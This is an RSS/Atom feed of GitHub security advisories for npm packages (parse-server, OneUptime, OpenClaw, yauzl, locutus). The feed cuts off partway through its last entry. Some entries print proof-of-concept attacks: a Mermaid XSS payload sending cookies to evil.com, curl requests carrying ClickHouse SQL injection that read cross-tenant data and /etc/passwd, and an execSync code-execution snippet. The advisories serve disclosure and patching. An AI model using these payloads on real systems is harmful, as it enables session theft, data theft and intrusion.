<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-03-13T20:04:30.724Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server OAuth2 adapter app ID validation sends wrong token to introspection endpoint]]></title>
        <id>https://github.com/advisories/GHSA-69xg-f649-w5g2</id>
        <link href="https://github.com/advisories/GHSA-69xg-f649-w5g2"/>
        <updated>2026-03-13T20:02:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The OAuth2 authentication adapter does not correctly validate app IDs when <code>appidField</code> and <code>appIds</code> are configured. During app ID validation, a malformed value is sent to the token introspection endpoint instead of the user's actual access token. Depending on the introspection endpoint's behavior, this could either cause all OAuth2 logins to fail, or allow authentication from disallowed app contexts if the endpoint returns valid-looking data for the malformed request.</p>
<p>Deployments using the OAuth2 adapter with <code>appidField</code> and <code>appIds</code> configured are affected.</p>
<h3 id="patches">Patches</h3>
<p>The fix corrects the parameter alignment in the OAuth2 adapter's app ID validation method to match the expected interface, ensuring the correct access token is sent to the introspection endpoint.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2">https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2</a></li>
<li>Fix in Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13</a></li>
<li>Fix in Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.39">https://github.com/parse-community/parse-server/releases/tag/8.6.39</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2">https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32269">https://nvd.nist.gov/vuln/detail/CVE-2026-32269</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.39">https://github.com/parse-community/parse-server/releases/tag/8.6.39</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13</a></li>
<li><a href="https://github.com/advisories/GHSA-69xg-f649-w5g2">https://github.com/advisories/GHSA-69xg-f649-w5g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69xg-f649-w5g2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T20:02:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server OAuth2 adapter app ID validation sends wrong token to introspection endpoint]]></title>
        <id>https://github.com/advisories/GHSA-69xg-f649-w5g2</id>
        <link href="https://github.com/advisories/GHSA-69xg-f649-w5g2"/>
        <updated>2026-03-13T20:02:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The OAuth2 authentication adapter does not correctly validate app IDs when <code>appidField</code> and <code>appIds</code> are configured. During app ID validation, a malformed value is sent to the token introspection endpoint instead of the user's actual access token. Depending on the introspection endpoint's behavior, this could either cause all OAuth2 logins to fail, or allow authentication from disallowed app contexts if the endpoint returns valid-looking data for the malformed request.</p>
<p>Deployments using the OAuth2 adapter with <code>appidField</code> and <code>appIds</code> configured are affected.</p>
<h3 id="patches">Patches</h3>
<p>The fix corrects the parameter alignment in the OAuth2 adapter's app ID validation method to match the expected interface, ensuring the correct access token is sent to the introspection endpoint.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2">https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2</a></li>
<li>Fix in Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13</a></li>
<li>Fix in Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.39">https://github.com/parse-community/parse-server/releases/tag/8.6.39</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2">https://github.com/parse-community/parse-server/security/advisories/GHSA-69xg-f649-w5g2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32269">https://nvd.nist.gov/vuln/detail/CVE-2026-32269</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.39">https://github.com/parse-community/parse-server/releases/tag/8.6.39</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.13</a></li>
<li><a href="https://github.com/advisories/GHSA-69xg-f649-w5g2">https://github.com/advisories/GHSA-69xg-f649-w5g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69xg-f649-w5g2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T20:02:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oneuptime] OneUptime: Stored XSS via Mermaid Diagram Rendering (securityLevel: "loose")]]></title>
        <id>https://github.com/advisories/GHSA-wvh5-6vjm-23qh</id>
        <link href="https://github.com/advisories/GHSA-wvh5-6vjm-23qh"/>
        <updated>2026-03-13T20:00:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Markdown viewer component renders Mermaid diagrams with <code>securityLevel: "loose"</code> and injects the SVG output via <code>innerHTML</code>. This configuration explicitly allows interactive event bindings in Mermaid diagrams, enabling XSS through Mermaid's <code>click</code> directive which can execute arbitrary JavaScript. Any field that renders markdown (incident descriptions, status page announcements, monitor notes) is vulnerable.</p>
<h3 id="details">Details</h3>
<p><strong>Mermaid configuration — <code>Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx:76</code>:</strong></p>
<pre><code class="language-typescript">// MarkdownViewer.tsx:76
mermaid.initialize({
    securityLevel: "loose",  // Allows interactive event bindings
    // ...
});
</code></pre>
<p>The Mermaid documentation explicitly warns: <code>securityLevel: "loose"</code> allows click events and other interactive bindings in diagrams. The safe default is <code>"strict"</code> which strips all interactivity.</p>
<p><strong>SVG injection via innerHTML — <code>MarkdownViewer.tsx:106</code>:</strong></p>
<pre><code class="language-typescript">// MarkdownViewer.tsx:106
if (containerRef.current) {
    containerRef.current.innerHTML = svg;  // Raw SVG injection
}
</code></pre>
<p>After Mermaid renders the diagram to SVG, the SVG string is injected directly into the DOM via <code>innerHTML</code>. Combined with <code>securityLevel: "loose"</code>, this allows event handlers embedded in the SVG to execute.</p>
<p><strong>Mermaid XSS payload:</strong></p>
<pre><code class="language-markdown">```mermaid
graph TD
    A["Click me"]
    click A callback "javascript:fetch('https://evil.com/?c='+document.cookie)"
```​
</code></pre>
<p>With <code>securityLevel: "loose"</code>, Mermaid processes the <code>click</code> directive and creates an SVG element with an event handler that executes the JavaScript.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash"># Authenticate
TOKEN=$(curl -s -X POST 'https://TARGET/identity/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"password123"}' \
  | jq -r '.token')

# Create an incident note with Mermaid XSS payload
curl -s -X POST 'https://TARGET/api/incident-note' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "data": {
      "incidentId": "INCIDENT_ID",
      "note": "## Root Cause Analysis\n\n```mermaid\ngraph TD\n    A[\"Load Balancer\"] --&gt; B[\"App Server\"]\n    click A callback \"javascript:fetch('"'"'https://evil.com/?c='"'"'+document.cookie)\"\n```",
      "noteType": "RootCause"
    }
  }'

# Any user viewing this incident note will have their cookies exfiltrated
</code></pre>
<pre><code class="language-bash"># Verify the vulnerability in source code:

# 1. securityLevel: "loose":
grep -n 'securityLevel' Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx
# Line 76: securityLevel: "loose"

# 2. innerHTML injection:
grep -n 'innerHTML' Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx
# Line 106: containerRef.current.innerHTML = svg
</code></pre>
<h3 id="impact">Impact</h3>
<p><strong>Stored XSS in any markdown-rendered field.</strong> Affects:</p>
<ol>
<li><strong>Incident notes/descriptions</strong> — viewed by on-call engineers during incidents</li>
<li><strong>Status page announcements</strong> — viewed by public visitors</li>
<li><strong>Monitor descriptions</strong> — viewed by team members</li>
<li><strong>Any markdown field</strong> — the MarkdownViewer component is shared across the UI</li>
</ol>
<p>The "loose" security level combined with <code>innerHTML</code> injection allows arbitrary JavaScript execution in the context of the OneUptime application.</p>
<h3 id="proposed-fix">Proposed Fix</h3>
<pre><code class="language-typescript">// 1. Change securityLevel to "strict" (default safe mode):
mermaid.initialize({
    securityLevel: "strict",  // Strips all interactive bindings
    // ...
});

// 2. Use DOMPurify on the SVG output before innerHTML injection:
import DOMPurify from "dompurify";

if (containerRef.current) {
    containerRef.current.innerHTML = DOMPurify.sanitize(svg, {
        USE_PROFILES: { svg: true, svgFilters: true },
        ADD_TAGS: ['foreignObject'],
    });
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/security/advisories/GHSA-wvh5-6vjm-23qh">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-wvh5-6vjm-23qh</a></li>
<li><a href="https://github.com/OneUptime/oneuptime/releases/tag/10.0.23">https://github.com/OneUptime/oneuptime/releases/tag/10.0.23</a></li>
<li><a href="https://github.com/advisories/GHSA-wvh5-6vjm-23qh">https://github.com/advisories/GHSA-wvh5-6vjm-23qh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvh5-6vjm-23qh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T20:00:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oneuptime]  OneUptime ClickHouse SQL Injection via Aggregate Query Parameters]]></title>
        <id>https://github.com/advisories/GHSA-p5g2-jm85-8g35</id>
        <link href="https://github.com/advisories/GHSA-p5g2-jm85-8g35"/>
        <updated>2026-03-13T20:00:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The telemetry aggregation API accepts user-controlled <code>aggregationType</code>, <code>aggregateColumnName</code>, and <code>aggregationTimestampColumnName</code> parameters and interpolates them directly into ClickHouse SQL queries via the <code>.append()</code> method (documented as "trusted SQL"). There is no allowlist, no parameterized query binding, and no input validation. An authenticated user can inject arbitrary SQL into ClickHouse, enabling full database read (including telemetry data from all tenants), data modification, and potential remote code execution via ClickHouse table functions.</p>
<h3 id="details">Details</h3>
<p><strong>Entry Point — <code>Common/Server/API/BaseAnalyticsAPI.ts:88-98, 292-296</code>:</strong></p>
<p>The <code>POST /{modelName}/aggregate</code> route deserializes <code>aggregateBy</code> directly from the request body:</p>
<pre><code class="language-typescript">// BaseAnalyticsAPI.ts:292-296
const aggregateBy: AggregateBy&lt;TBaseModel&gt; = JSONFunctions.deserialize(
    req.body["aggregateBy"]
) as AggregateBy&lt;TBaseModel&gt;;
</code></pre>
<p>No schema validation is applied to <code>aggregateBy</code>. The object flows directly to the database service.</p>
<p><strong>No Validation — <code>Common/Server/Services/AnalyticsDatabaseService.ts:276-278</code>:</strong></p>
<pre><code class="language-typescript">// AnalyticsDatabaseService.ts:276-278
if (aggregateBy.aggregationType) {
    // Only truthiness check — no allowlist
}
</code></pre>
<p>The <code>aggregationType</code> field is only checked for existence, never validated against an allowed set of values (e.g., <code>AVG</code>, <code>SUM</code>, <code>COUNT</code>).</p>
<p><strong>Raw SQL Injection — <code>Common/Server/Utils/AnalyticsDatabase/StatementGenerator.ts:527</code>:</strong></p>
<pre><code class="language-typescript">// StatementGenerator.ts:527
statement.append(
    `${aggregationType}(${aggregateColumnName}) as aggregationResult`
);
</code></pre>
<p>The <code>.append()</code> method on <code>Statement</code> (at <code>Statement.ts:149-151</code>) is documented as accepting <strong>trusted SQL</strong> and performs raw string concatenation:</p>
<pre><code class="language-typescript">// Statement.ts:149-151
public append(text: string): Statement {
    this.query += text; // Raw concatenation — "trusted SQL"
    return this;
}
</code></pre>
<p>Similarly, <code>aggregationTimestampColumnName</code> is injected into GROUP BY clauses at <code>AnalyticsDatabaseService.ts:604-606</code>:</p>
<pre><code class="language-typescript">statement.append(
    `toStartOfInterval(${aggregationTimestampColumnName}, ...)`
);
</code></pre>
<p><strong>Attack flow:</strong></p>
<ol>
<li>Authenticated user sends <code>POST /api/log/aggregate</code> (or <code>/api/span/aggregate</code>, <code>/api/metric/aggregate</code>)</li>
<li>Request body contains <code>aggregateBy.aggregationType</code> set to a SQL injection payload</li>
<li>Payload passes truthiness check at line 276</li>
<li>Payload is concatenated into SQL via <code>.append()</code> at line 527</li>
<li>ClickHouse executes the injected SQL</li>
</ol>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash"># Step 1: Authenticate and get session token
TOKEN=$(curl -s -X POST 'https://TARGET/identity/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"password123"}' \
  | jq -r '.token')

# Step 2: Extract data from ClickHouse system tables via UNION injection
curl -s -X POST 'https://TARGET/api/log/aggregate' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "aggregateBy": {
      "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT name FROM system.tables WHERE database = '\''oneuptime'\'' --",
      "aggregateColumnName": "serviceId",
      "aggregationTimestampColumnName": "createdAt"
    },
    "query": {}
  }'

# Step 3: Read telemetry data across all tenants
curl -s -X POST 'https://TARGET/api/log/aggregate' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "aggregateBy": {
      "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT body FROM Log LIMIT 100 --",
      "aggregateColumnName": "serviceId",
      "aggregationTimestampColumnName": "createdAt"
    },
    "query": {}
  }'

# Step 4: Read files via ClickHouse table functions (if enabled)
curl -s -X POST 'https://TARGET/api/log/aggregate' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -H 'tenantid: PROJECT_ID' \
  -d '{
    "aggregateBy": {
      "aggregationType": "COUNT) as aggregationResult FROM system.one UNION ALL SELECT * FROM file('\''/etc/passwd'\'') --",
      "aggregateColumnName": "serviceId",
      "aggregationTimestampColumnName": "createdAt"
    },
    "query": {}
  }'
</code></pre>
<pre><code class="language-bash"># Verify the vulnerability in source code:

# 1. No allowlist for aggregationType:
grep -n 'aggregationType' Common/Server/Services/AnalyticsDatabaseService.ts | head -5
# Line 276: if (aggregateBy.aggregationType) { — truthiness only

# 2. Raw SQL concatenation:
grep -n 'aggregationType.*aggregateColumnName' Common/Server/Utils/AnalyticsDatabase/StatementGenerator.ts
# Line 527: `${aggregationType}(${aggregateColumnName}) as aggregationResult`

# 3. .append() is raw concatenation:
grep -A3 'public append' Common/Server/Utils/AnalyticsDatabase/Statement.ts
# this.query += text; — "trusted SQL"

# 4. No validation at API layer:
grep -A5 'aggregateBy' Common/Server/API/BaseAnalyticsAPI.ts | grep -c 'validate\|sanitize\|allowlist'
# 0
</code></pre>
<h3 id="impact">Impact</h3>
<p><strong>Full ClickHouse database compromise.</strong> An authenticated user (any role) can:</p>
<ol>
<li><strong>Cross-tenant data theft</strong> — Read telemetry data (logs, traces, metrics, exceptions) from ALL tenants/projects in the ClickHouse database, not just their own</li>
<li><strong>Data manipulation</strong> — INSERT/ALTER/DROP tables in ClickHouse, destroying telemetry data for all users</li>
<li><strong>Server-side file read</strong> — Via ClickHouse's <code>file()</code> table function (if not explicitly disabled), read arbitrary files from the ClickHouse container filesystem</li>
<li><strong>Remote code execution</strong> — Via ClickHouse's <code>url()</code> table function, make HTTP requests from the server (SSRF), or via <code>executable()</code> table function, execute OS commands</li>
<li><strong>Credential theft</strong> — ClickHouse default configuration (<code>default</code> user, password from env) could be leveraged to connect directly</li>
</ol>
<p>The vulnerability requires only basic authentication (any registered user), making it exploitable at scale.</p>
<h3 id="proposed-fix">Proposed Fix</h3>
<pre><code class="language-typescript">// 1. Add an allowlist for aggregationType in AnalyticsDatabaseService.ts:
const ALLOWED_AGGREGATION_TYPES = ['AVG', 'SUM', 'COUNT', 'MIN', 'MAX', 'UNIQ'];

if (!ALLOWED_AGGREGATION_TYPES.includes(aggregateBy.aggregationType.toUpperCase())) {
    throw new BadRequestException(
        `Invalid aggregationType: ${aggregateBy.aggregationType}. ` +
        `Allowed: ${ALLOWED_AGGREGATION_TYPES.join(', ')}`
    );
}

// 2. Validate aggregateColumnName against the model's known columns:
const modelColumns = model.getColumnNames(); // or similar accessor
if (!modelColumns.includes(aggregateBy.aggregateColumnName)) {
    throw new BadRequestException(
        `Invalid column: ${aggregateBy.aggregateColumnName}`
    );
}

// 3. Same for aggregationTimestampColumnName:
if (aggregateBy.aggregationTimestampColumnName &amp;&amp;
    !modelColumns.includes(aggregateBy.aggregationTimestampColumnName)) {
    throw new BadRequestException(
        `Invalid timestamp column: ${aggregateBy.aggregationTimestampColumnName}`
    );
}

// 4. Use parameterized queries where possible:
statement.append(`{aggregationType:Identifier}({columnName:Identifier}) as aggregationResult`);
statement.addParameter('aggregationType', aggregateBy.aggregationType);
statement.addParameter('columnName', aggregateBy.aggregateColumnName);
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/security/advisories/GHSA-p5g2-jm85-8g35">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-p5g2-jm85-8g35</a></li>
<li><a href="https://github.com/OneUptime/oneuptime/releases/tag/10.0.23">https://github.com/OneUptime/oneuptime/releases/tag/10.0.23</a></li>
<li><a href="https://github.com/advisories/GHSA-p5g2-jm85-8g35">https://github.com/advisories/GHSA-p5g2-jm85-8g35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p5g2-jm85-8g35</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-13T20:00:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Discord guild reaction ingress could bypass users and roles allowlists]]></title>
        <id>https://github.com/advisories/GHSA-9vvh-2768-c8vp</id>
        <link href="https://github.com/advisories/GHSA-9vvh-2768-c8vp"/>
        <updated>2026-03-13T18:58:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, Discord reaction ingestion for guild channels did not enforce the same member users and roles allowlist checks used for normal inbound guild messages. A non-allowlisted guild member could still trigger reaction events that were accepted and queued as trusted system events for the target session.</p>
<h2 id="impact">Impact</h2>
<p>This is an authorization bypass in the Discord allowlist path. Reaction text could be injected into downstream session context even when the reacting guild member was not permitted by the configured users or roles allowlist.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt; 2026.3.11</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The reaction ingress authorization path enforced DM, group, guild, and channel policy checks, but it did not apply the member-level users and roles allowlist gate that normal guild-message preflight uses. Accepted reactions were then enqueued as trusted system events for the routed session.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now applies the same users and roles allowlist enforcement to guild reaction ingress that it already applies to normal inbound guild messages. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-9vvh-2768-c8vp">https://github.com/openclaw/openclaw/security/advisories/GHSA-9vvh-2768-c8vp</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-9vvh-2768-c8vp">https://github.com/advisories/GHSA-9vvh-2768-c8vp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9vvh-2768-c8vp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T18:58:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yauzl] yauzl contains an off-by-one error]]></title>
        <id>https://github.com/advisories/GHSA-gmq8-994r-jv83</id>
        <link href="https://github.com/advisories/GHSA-gmq8-994r-jv83"/>
        <updated>2026-03-13T18:58:14.000Z</updated>
        <content type="html"><![CDATA[<p>yauzl (aka Yet Another Unzip Library) version 3.2.0 for Node.js contains an off-by-one error in the NTFS extended timestamp extra field parser within the getLastModDate() function. The while loop condition checks cursor &lt; data.length + 4 instead of cursor + 4 &lt;= data.length, allowing readUInt16LE() to read past the buffer boundary. A remote attacker can cause a denial of service (process crash via ERR_OUT_OF_RANGE exception) by sending a crafted zip file with a malformed NTFS extra field. This affects any Node.js application that processes zip file uploads and calls entry.getLastModDate() on parsed entries. Fixed in version 3.2.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31988">https://nvd.nist.gov/vuln/detail/CVE-2026-31988</a></li>
<li><a href="https://github.com/thejoshwolfe/yauzl/commit/c4695215b05c6adffda613b9051a2a85429b33fe">https://github.com/thejoshwolfe/yauzl/commit/c4695215b05c6adffda613b9051a2a85429b33fe</a></li>
<li><a href="https://www.codeant.ai/security-research/yauzl-denial-of-service-zip-file-crash">https://www.codeant.ai/security-research/yauzl-denial-of-service-zip-file-crash</a></li>
<li><a href="https://www.npmjs.com/package/yauzl">https://www.npmjs.com/package/yauzl</a></li>
<li><a href="https://www.vulncheck.com/advisories/yauzl-denial-of-service-via-off-by-one-error-in-ntfs-timestamp-parser">https://www.vulncheck.com/advisories/yauzl-denial-of-service-via-off-by-one-error-in-ntfs-timestamp-parser</a></li>
<li><a href="https://github.com/advisories/GHSA-gmq8-994r-jv83">https://github.com/advisories/GHSA-gmq8-994r-jv83</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gmq8-994r-jv83</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-12T00:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[locutus] Locutus vulnerable to RCE via unsanitized input in create_function()]]></title>
        <id>https://github.com/advisories/GHSA-vh9h-29pq-r5m8</id>
        <link href="https://github.com/advisories/GHSA-vh9h-29pq-r5m8"/>
        <updated>2026-03-13T16:10:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>create_function(args, code)</code> function passes both parameters directly to the <code>Function</code> constructor without any sanitization, allowing arbitrary code execution.</p>
<p>This is distinct from CVE-2026-29091 (GHSA-fp25-p6mj-qqg6) which was <code>call_user_func_array</code> using <code>eval()</code> in v2.x. This finding affects <code>create_function</code> using <code>new Function()</code> in v3.x.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>src/php/funchand/create_function.ts:17</code>:</p>
<pre><code class="language-typescript">return new Function(...params, code)
</code></pre>
<p>Zero input validation on either parameter.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-javascript">const { create_function } = require('locutus/php/funchand/create_function');
const rce = create_function('', 'return require("child_process").execSync("id").toString()');
console.log(rce());
// Output: uid=501(user) gid=20(staff) ...
</code></pre>
<p>Confirmed on locutus v3.0.11, Node.js v24.13.1.</p>
<h2 id="impact">Impact</h2>
<p>Full RCE when an attacker can control either argument to <code>create_function()</code>. 597K weekly npm downloads.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Remove <code>create_function</code> or replace <code>new Function()</code> with a safe alternative. PHP itself deprecated <code>create_function()</code> in PHP 7.2 for the same reason.</p>
<h2 id="response">Response</h2>
<p>Thanks for the report.</p>
<p>We confirmed that <code>php/funchand/create_function</code> was still present through <code>locutus@3.0.13</code> and that it exposed dynamic code execution via <code>new Function(...)</code>.</p>
<p>While this was intended behavior, <code>create_function()</code> inherently needs to be unsafe in order for it to work, <code>create_function()</code> was deprecated in PHP 7.2 and removed in PHP 8.0. Given that Locutus' parity target today is 8.3, this function shouldn't have been in Locutus at all anymore.</p>
<p>We fixed this in <code>locutus@3.0.14</code> by removing <code>php/funchand/create_function</code> entirely. That matches our PHP 8.3 parity target more closely: . </p>
<p>We also updated <code>php/var/var_export</code> so closures now export using the PHP 8-style <code>\Closure::__set_state(array(...))</code> form instead of referencing the removed API.</p>
<p>Release:</p>
<ul>
<li>npm: <code>locutus@3.0.14</code></li>
<li>GitHub release: <a href="https://github.com/locutusjs/locutus/releases/tag/v3.0.14">https://github.com/locutusjs/locutus/releases/tag/v3.0.14</a></li>
</ul>
<p>Credit to @ByamB4 for the report.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/locutusjs/locutus/security/advisories/GHSA-vh9h-29pq-r5m8">https://github.com/locutusjs/locutus/security/advisories/GHSA-vh9h-29pq-r5m8</a></li>
<li><a href="https://github.com/locutusjs/locutus/releases/tag/v3.0.14">https://github.com/locutusjs/locutus/releases/tag/v3.0.14</a></li>
<li><a href="https://github.com/advisories/GHSA-vh9h-29pq-r5m8">https://github.com/advisories/GHSA-vh9h-29pq-r5m8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vh9h-29pq-r5m8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-13T16:10:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Unavailable local auth SecretRefs could fall through to remote credentials in local mode]]></title>
        <id>https://github.com/advisories/GHSA-qvr7-g57c-mrc7</id>
        <link href="https://github.com/advisories/GHSA-qvr7-g57c-mrc7"/>
        <updated>2026-03-13T15:48:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In affected versions of <code>openclaw</code>, local gateway helper credential resolution treated configured but unavailable <code>gateway.auth.token</code> and <code>gateway.auth.password</code> SecretRefs as if they were unset and could fall back to <code>gateway.remote.*</code> credentials in local mode.</p>
<h2 id="impact">Impact</h2>
<p>This could cause local CLI and helper paths to select the wrong credential source instead of failing closed for configured local auth SecretRefs. We did not confirm a server-side gateway-authentication boundary bypass for this issue.</p>
<h2 id="affected-packages-and-versions">Affected Packages and Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.8</code></li>
<li>Fixed in: <code>2026.3.11</code></li>
</ul>
<h2 id="technical-details">Technical Details</h2>
<p>The local-mode fallback logic decided whether remote credential fallback was allowed based on resolved credential values rather than on whether the local auth input was actually configured. A configured-but-unavailable local SecretRef therefore looked "absent" to the helper layer.</p>
<h2 id="fix">Fix</h2>
<p>OpenClaw now tracks whether the local auth input is configured separately from whether it resolves successfully. In local mode, remote fallback is allowed only when the matching local auth input is truly unset. The fix shipped in <code>openclaw@2026.3.11</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to <code>2026.3.11</code> or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-qvr7-g57c-mrc7">https://github.com/openclaw/openclaw/security/advisories/GHSA-qvr7-g57c-mrc7</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.11">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-qvr7-g57c-mrc7">https://github.com/advisories/GHSA-qvr7-g57c-mrc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvr7-g57c-mrc7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-13T15:48:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Sandbox staged writes could escape the verified parent directory before commit]]></title>
        <id>https://github.com/advisories/GHSA-mj4p-rc52-m843</id>
        <link href="https://github.com/advisories/GHSA-mj4p-rc52-m843"/>
        <updated>2026-03-13T15:48:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
